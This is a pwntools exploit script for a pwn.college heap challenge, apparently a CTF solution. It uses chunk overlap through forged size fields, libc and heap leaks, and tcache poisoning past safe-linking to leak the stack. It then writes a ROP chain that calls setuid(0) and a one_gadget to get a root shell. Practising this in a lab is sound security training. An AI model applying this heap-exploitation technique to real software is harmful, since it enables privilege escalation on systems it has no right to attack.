from pwn import *
from time import sleep
context.binary=e=ELF("./babyheap_level20.0")
libc=e.libc
gs="""
set follow-fork-mode parent
b win
b *main+1483
"""
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyheap_level20.0")
if args.DEBUG:
    context.log_level='debug'
def malloc(idx: int,size: int):
    p.sendlineafter(b"[*] Function",b"malloc")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size: ",str(size).encode())
def free(idx: int):
    p.sendlineafter(b"[*] Function",b"free")
    p.sendlineafter(b"Index: ",str(idx).encode())
def safe_write(idx: int):
    p.sendlineafter(b"[*] Function",b"safe_write")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.recvuntil(f"[*] safe_write(allocations[{idx}])\n".encode())
    return p.recvuntil(b"\n")
def safe_read(idx: int,buffer: bytes):
    p.sendlineafter(b"[*] Function",b"safe_read")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.send(buffer)
    sleep(0.5)
malloc(0,0x308)
malloc(1,0x308)
malloc(2,0x308)
malloc(3,0x10)
safe_read(0,b"\x00"*0x300+p64(0)+p64(0x310*2+1))
free(1)
malloc(4,0x308)
malloc(5,0x308)
libc.address=int(safe_write(4)[0:7][::-1].hex(),16)-0x21a150
log.info(f"libc @ {hex(libc.address)}")
malloc(0,0x288)
malloc(1,0x5f8)
malloc(2,0x288)
safe_read(0,b"\x00"*0x280+p64(0)+p64(0x600+0x290+1))
free(1)
malloc(1,0x5f8)
malloc(3,0x288)
safe_read(0,b"\x00"*0x280+p64(0)+p64(0x600+0x290+1))
free(1)
malloc(1,0x5f8)
malloc(4,0x288)
free(2)
tcache=(int(safe_write(3)[0:6][::-1].hex(),16) << 12) -0x1000 + 0x10
pos=tcache+0x1a80
log.info(f"tcache @ {hex(tcache)}")
log.info(f"pos @ {hex(pos)}")
safe_read(3,p64(0)*2)
free(3)
safe_read(4,p64( (pos >> 12) ^ tcache))
malloc(0,0x288)
malloc(1,0x288)
safe_read(1,p16(0)*6+p16(7)+p16(0)*(64-7)+
            p64(0)*6+p64(libc.sym.environ))
malloc(2,0x78)
leak_stack=int(safe_write(2)[0:7][::-1].hex(),16)
log.info(f"leak stack: {hex(leak_stack)}")

main_rbp=leak_stack-0x128
safe_read(1,p16(0)*6+p16(7)+p16(0)*(64-7)+
            p64(0)*6+p64(main_rbp))
malloc(3,0x78)
rdi_ret=libc.address+0x000000000002a3e5
rsi_ret=libc.address+0x000000000002be51
rbp_ret=libc.address+0x000000000002a2e0
safe_read(3,p64(0)+
        p64(rdi_ret)+p64(0)+
        p64(libc.sym.setuid)+
        p64(rsi_ret)+p64(0)+
        p64(rbp_ret)+p64(pos+0x78)+
        p64(libc.address+0xebcf8))

p.sendlineafter(b"[*] Function",b"quit")
p.interactive()